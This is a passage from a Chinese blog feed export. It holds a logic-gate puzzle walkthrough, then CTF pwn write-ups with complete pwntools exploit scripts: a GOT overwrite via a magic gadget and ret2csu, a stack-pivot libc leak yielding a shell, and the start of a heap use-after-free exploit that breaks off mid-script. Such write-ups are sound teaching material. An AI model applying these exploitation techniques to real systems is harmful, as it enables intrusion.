alt="非门"></p><h2 id="与门"><a href="#与门" class="headerlink" title="与门"></a>与门</h2><p>这个逻辑我们很熟悉，AND。问题在于我们现在只有与非门和非门可以用。仔细观察与非门和与门的真值表可以发现，它们的输出完全反过来。所以我们只需要在输入给到与非门后取反即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%97%A8.png" alt="与门"></p><p>与门的性质就是，全真才为真。而与非门就可以理解为，与后非，即全假才为真。</p><h2 id="或门"><a href="#或门" class="headerlink" title="或门"></a>或门</h2><p>或门也是我们熟悉的OR，有真即为真。我们对比一下与非门和或门的真值表，会发现他们的输出刚好左右对称。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%9D%9E%E9%97%A8.png" alt="与非门"></p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%97%A8%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="或门真值表"></p><p>这里就要引出数电中很基础的一个定理：德摩根定律。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%BE%B7%E6%91%A9%E6%A0%B9%E5%AE%9A%E5%BE%8B.png" alt="德摩根定律"></p><p>通俗点来讲就是，如果我们在输入的时候就取反，那么输出就会呈左右对称。如果我们在输出取反，那么输出会分别取反。回到这道题，我们只需要在与非门的输入（元件左边）取反，就能得到或门。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%97%A8.png" alt="或门"></p><h2 id="或非门"><a href="#或非门" class="headerlink" title="或非门"></a>或非门</h2><p>NOR，类比一下与非门的命名逻辑，显然或非门就是或后非。所以只要在或门后面的输出加上非门即可。这也是为什么前面先讲了或门，才来讲或非门。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%9D%9E%E9%97%A8.png" alt="或非门"></p><h2 id="高电平"><a href="#高电平" class="headerlink" title="高电平"></a>高电平</h2><p>题目要求无论是输入是什么，输出时钟需要保持高电平（即为1）。很显然在只有一个输入的情况下，我们需要将其分为两条路子来给到元件，但是尽管是两条路也肯定没法保证全部都是高电平，但是可以轻松做到一个高电平一个低电平。我们利用或门（或者与非门）的性质就能永远输出高电平了。（解法不止一种）</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E9%AB%98%E7%94%B5%E5%B9%B3.png" alt="高电平"></p><h2 id="第二刻"><a href="#第二刻" class="headerlink" title="第二刻"></a>第二刻</h2><p>这道题其实有一种对着答案出题的感觉，其实完全不用管第几刻的问题，直接对着给出的真值表造就行。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E7%AC%AC%E4%BA%8C%E5%88%BB.png" alt="第二刻"></p><p>也不难发现，试想如果将真值表中输入2的值全部倒转会发生什么，那就变成与门的真值表了！所以我们只需要在输入2处加个非门即可。举一反三，如果下次要第三刻怎么办？诶！想想摩根定律。</p><h2 id="异或门"><a href="#异或门" class="headerlink" title="异或门"></a>异或门</h2><p>XOR，但是只能用前面见到过的元件。有一说一，有点难想。我的视角是这样的：观察真值表会发现，除了真真得假之外，其他三项和或门的性质很像，于是想到最后可能要用到或门在输出的位置，那么现在问题就转变成了如何在两个都为真的时候，让进入或门的两个输入都变成低电平。</p><p>我们现在抛弃其他的不想，我们就抓着或门的其中给一个输入来考虑。如果两个输入中一个接一个非门，然后接入与门，是不是就能实现两个输入为真的时候输出低电平？巧妙的是，当没接非门的那一个输入为真的时候，与门也能输出真，这不就符合了我们满足真真得假的设想。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%BC%82%E6%88%96%E9%97%A8.png" alt="异或门"></p><h2 id="三路或门"><a href="#三路或门" class="headerlink" title="三路或门"></a>三路或门</h2><p>有一个真即为真，叠或门即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%89%E8%B7%AF%E6%88%96%E9%97%A8.png" alt="三路或门"></p><h2 id="三路与门"><a href="#三路与门" class="headerlink" title="三路与门"></a>三路与门</h2><p>全为真才为真，叠与门即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%89%E8%B7%AF%E4%B8%8E%E9%97%A8.png" alt="三路与门"></p><h2 id="同或门"><a href="#同或门" class="headerlink" title="同或门"></a>同或门</h2><p>XNOR，真值表和异或门刚好反过来，根据摩根定律，在输出处加上非门即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%90%8C%E6%88%96%E9%97%A8.png" alt="同或门"></p>]]></content>
      
      
      <categories>
          
          <category> 图灵完备 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图灵完备 </tag>
            
            <tag> 计组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>没有输出函数的情况下magic_gadget的利用</title>
      <link href="/2024/magic-gadget/"/>
      <url>/2024/magic-gadget/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是magic-gadget"><a href="#什么是magic-gadget" class="headerlink" title="什么是magic_gadget"></a>什么是magic_gadget</h3><p>magic gadget其实是一类gadget的统称，指可以巧妙地实现某些目的的gadget。这里要讲的gadget只是众多magic gadget中的其中一个，可以在没法泄露libc地址的时候达到能够使用libc地址的目的。</p><p>这里要讲的gadget位于程序的<code>__do_global_dtors_aux</code>函数中，偏移是0x18。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add     [rbp-3Dh], ebx</span><br></pre></td></tr></table></figure><p>在IDA正常反编译下是看不到这个gadget的，只有重新在0x18处反汇编才能看到。显然，这个gadget可以实现在某一个栈上数据加上一个偏移。假如在rbp-0x3D处存在一个libc地址，并且这个地址每次运行都是一样的（相对偏移），那么我就可以通过控制ebx寄存器，使用这个gadget把那个libc地址变成ogg或者system，从而返回获得一个shell。</p><p>但是很显然，rbp-0x3D很难直接是一个返回地址，就算是被调用者的返回地址，也会被覆盖。</p><p>如果能知道栈地址，劫持rbp进行栈迁移也许是个不错的选择，但是本来就是在没法泄露地址的情况（一般是连输出函数都没有但是又有栈溢出的情况），所以这个压根没机会。比较常见的使用方法是：</p><ol><li>如果没有开full relro，劫持rbp到got表，修改got表后进行rop。</li><li>如果没有开地址随机化，可以栈迁移到bss段，然后调用libc_start_main在bss段上留下libc地址，然后再劫持rbp到那个地址的相应偏移处（依然在bss），修改某个libc地址为ogg或者system后ROP。</li></ol><h3 id="2024-BaseCTF-ezstack"><a href="#2024-BaseCTF-ezstack" class="headerlink" title="2024 BaseCTF ezstack"></a>2024 BaseCTF ezstack</h3><p>这道题，爱来自gets师傅（</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序除了一个gets函数之外就什么都没有了。没有输出函数。靶机环境是2.35的，但是程序里出现了csu，这应该是出题人故意留的gadget（爱来自gets），刚好符合上面讲到的无输出函数的情况。我们来详细分析一下这题的做题步骤。</p><p>首先检查程序的保护情况，发现PIE没开，partial relro，所以优先考虑劫持got表。got表中可以供我们选择的函数并不多，gets函数我们还需要用它来传payload和binsh字符串，所以我们劫持setvbuf这个函数为system。</p><p>已经确定要使用<code>add     [rbp-3Dh], ebx</code>这个gadget，先看我们需要控制什么寄存器。首先rbp需要劫持为setvbuf的got表地址+0x3D，ebx应该存setvbuf与system两个函数在libc中的偏移，这样我们就能通过add将setvbuf的got表指向system。</p><p>我们利用ret2csu来控制寄存器，实际上我们只需要其中一段就够了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006EA                 pop     rbx</span><br><span class="line">.text:00000000004006EB                 pop     rbp</span><br><span class="line">.text:00000000004006EC                 pop     r12</span><br><span class="line">.text:00000000004006EE                 pop     r13</span><br><span class="line">.text:00000000004006F0                 pop     r14</span><br><span class="line">.text:00000000004006F2                 pop     r15</span><br><span class="line">.text:00000000004006F4                 retn</span><br></pre></td></tr></table></figure><p>前面两个就已经能够控制rbx和rbp了，其他都无所谓。于是写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor_off = (-<span class="number">0x30880</span>) &amp; <span class="number">0xffffffffffffffff</span> <span class="comment">#setvbuf和system之间的偏移，注意符号</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(buf_address)</span><br><span class="line">payload += p64(gadget_reg)</span><br><span class="line">payload += p64(<span class="number">0xfffffffffffcf780</span>)  <span class="comment"># xor_off</span></span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;setvbuf&#x27;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br></pre></td></tr></table></figure><p>buf_address处实际上写什么都无所谓。关于偏移的计算，可以手动在libc中查找后计算，也可以借助pwndbg来进行计算</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p setvbuf</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;int (FILE *, char *, int, size_t)&#125; 0x7fb610a4b5f0 &lt;__GI__IO_setvbuf&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p system</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = &#123;int (const char *)&#125; 0x7fb610a1ad70 &lt;__libc_system&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">distance 0x7fb610a4b5f0 0x7fb610a1ad70</span></span><br><span class="line"><span class="meta prompt_">0x7fb610a4b5f0-&gt;</span><span class="language-bash">0x7fb610a1ad70 is -0x30880 bytes (-0x6110 words)</span></span><br></pre></td></tr></table></figure><p>设置好寄存器之后就执行magic gadget。然后这时候setvbuf的got表就已经变成了system了，我们断点动调看看。<img src="https://c-lby.top/images/magic_gadget/%E5%8A%AB%E6%8C%81%E5%90%8E%E7%9A%84got%E8%A1%A8.png" alt="劫持后的got表"></p><p>确实劫持成功了。那接下来就是正常的ROP了，我们先利用gets函数把binsh写进到bss段，然后再传参执行system即可。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;challenge.basectf.fun&#x27;, 30854)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4006EA</span></span><br><span class="line">gadget_call = <span class="number">0x4006D0</span></span><br><span class="line">magic_gadget = <span class="number">0x4005D8</span></span><br><span class="line">rdi = <span class="number">0x4006f3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006f1</span></span><br><span class="line">leave_ret = <span class="number">0x40068c</span></span><br><span class="line">buf_address = e.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x400700</span></span><br><span class="line">init = <span class="number">0x400690</span></span><br><span class="line">main = <span class="number">0x40065D</span></span><br><span class="line"></span><br><span class="line">xor_off = (-<span class="number">0x30880</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">18446744073709352832</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(buf_address)</span><br><span class="line">payload += p64(gadget_reg)</span><br><span class="line">payload += p64(<span class="number">0xfffffffffffcf780</span>)  <span class="comment"># xor_off</span></span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;setvbuf&#x27;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(rdi)+p64(buf_address)+p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(rdi)+p64(buf_address)+p64(e.plt[<span class="string">&#x27;setvbuf&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> magic_gadget </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> magic_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『2024羊城杯初赛』 PWN WP</title>
      <link href="/2024/2024ycb-wp/"/>
      <url>/2024/2024ycb-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>非常经典的没有回显的0x10字节溢出，栈迁移。第一件事就要先考虑怎么泄露出libc地址。我们选择将栈劫持到bss段。从汇编代码可知vuln函数栈帧开辟了0x30大小，所以把rbp劫持为某个选定的bss段+0x30，这样rbp就会跳到bss+0x30。</p><p><img src="https://c-lby.top/images/2024ycb_wp/pstack_rbp%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B5.png" alt="pstack_rbp迁移到bss段"></p><p>因为read函数是通过<code>lea    rax, [rbp - 0x30]</code>寻址的，所以下一次read的时候payload会被写到0x601818。我们直接在这个地址上写泄露libc地址的ropchain，然后在rbp的地址处写上0x601810的话，rbp就会被劫持到那，这样经过一次leave ret之后就会从0x601850开始执行了。在这里写上leave ret，就能将rsp劫持到0x601818开始执行ropchain。这里需要注意一点是，一定要多执行一个mov rbp，rsp恢复一下两个的位置关系，因为这会rbp是0，不恢复的话后面的read没法寻址。</p><p><img src="https://c-lby.top/images/2024ycb_wp/pstack_rbp%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B52.png" alt="pstack_rbp迁移到bss段2"></p><p>泄露出来libc之后后面写system的ropchain就和前面的思路一样了。也是执行两次read两次leave ret后执行ropchain。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = e.bss()+<span class="number">0x808</span></span><br><span class="line">leave_ret = <span class="number">0x4006DB</span></span><br><span class="line">vuln = <span class="number">0x4006b0</span></span><br><span class="line">vuln_sub_30 = <span class="number">0x4006B4</span></span><br><span class="line">rdi = <span class="number">0x400773</span></span><br><span class="line">ret = <span class="number">0x4006DC</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss+<span class="number">0x30</span>)+p64(vuln_sub_30)</span><br><span class="line">payload1 = p64(rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(vuln)+p64(bss-<span class="number">0x8</span>)*<span class="number">3</span>+p64(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(payload1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload2 = p64(ret)+p64(rdi)+p64(binsh)+p64(system)+p64(bss-<span class="number">0x8</span>)*<span class="number">3</span>+p64(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><a href="https://blog.csdn.net/qq_44431690/article/details/108175827">Dijkstra算法学习</a></p><p>开了沙盒</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./pwn</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>那就走正常的orw。因为是2.35堆题，所以经典的apple2+setcontext+orw的组合。第一次调板子，好好分析一下这题。</p><p>审计代码发现delete的时候只清空了堆内对于城市名字记录的内容，没有清空route数组中地址的储存，所以有UAF漏洞。</p><h5 id="模板函数"><a href="#模板函数" class="headerlink" title="模板函数"></a>模板函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;&#x27;,)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;. Calculate the distance.&quot;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">vehicle, start, destination, far, note</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(</span><br><span class="line">        <span class="string">b&quot;What kind of transportation do you want? car/train/plane?&quot;</span>, vehicle)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;How far?&quot;</span>, <span class="built_in">str</span>(far).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Note:&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">start, destination</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">start, destination</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">start, destination, idx, far, note</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Which one do you want to change?&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;How far?&quot;</span>, <span class="built_in">str</span>(far).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Note:&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dj</span>(<span class="params">name</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    r.sendline(name)</span><br></pre></td></tr></table></figure><p>这道题因为开了沙盒，所以程序在初始化的时候就已经申请并且释放了很多堆到tcachebin甚至fastbin中，所以布局的时候需要注意。但是这道题里申请的堆至少是0x520大小的，所以一般情况下其实也不会涉及到tcachebin。</p><h5 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h5><p>这个show函数打印的内容是chunk+8和chunk+0x10两个地方，但是如果free之后，虽然有uaf，但是清空了堆里的城市名字之后，会识别不到相应的chunk，所以必须只能申请了释放掉再申请才能打印，这样一来，chunk+8的位置又被覆盖了。但是如果chunk进入了largebin，就会在chunk+0x10和0x18的地方留下堆地址，这里不会被覆盖。所以只要将chunk+0x10填满8字节就能把0x18处的堆地址带出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">free(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">show(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Note:deadbeef&quot;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = heap_addr-<span class="number">0x1470</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex(addr)&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br></pre></td></tr></table></figure><h5 id="关于edit功能"><a href="#关于edit功能" class="headerlink" title="关于edit功能"></a>关于edit功能</h5><p>edit这里有两个限制，一个是只能edit一次，第二是需要手动赋予edit的机会。第二个限制需要通过Dijkstra算法计算满足总路程超过2000才能有edit机会。所以我们在add的时候还要考虑路径要连得上，并且距离给大一点（不能超过1000）。</p><p>所以在刚刚泄露堆地址的时候就把这个考虑进去，修改一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span 